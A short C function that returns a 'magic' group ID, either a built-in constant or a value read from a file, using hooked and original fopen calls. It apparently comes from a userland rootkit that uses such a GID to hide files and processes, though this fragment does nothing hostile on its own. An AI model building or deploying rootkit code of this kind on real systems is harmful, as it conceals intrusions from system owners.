gid_t readgid(void){
#ifdef READ_GID_FROM_FILE
    FILE *fp;
    gid_t magicgid;
    char gidbuf[16];

    hook(CFOPEN);

    fp = call(CFOPEN, GID_PATH, "r");
    if(fp == NULL) return MAGIC_GID;
    fgets(gidbuf, sizeof(gidbuf), fp);
    fclose(fp);

    if(strlen(gidbuf)<=1)
        return MAGIC_GID;

    sscanf(gidbuf, "%u", &magicgid);
    return magicgid;
#else
    return MAGIC_GID;
#endif
}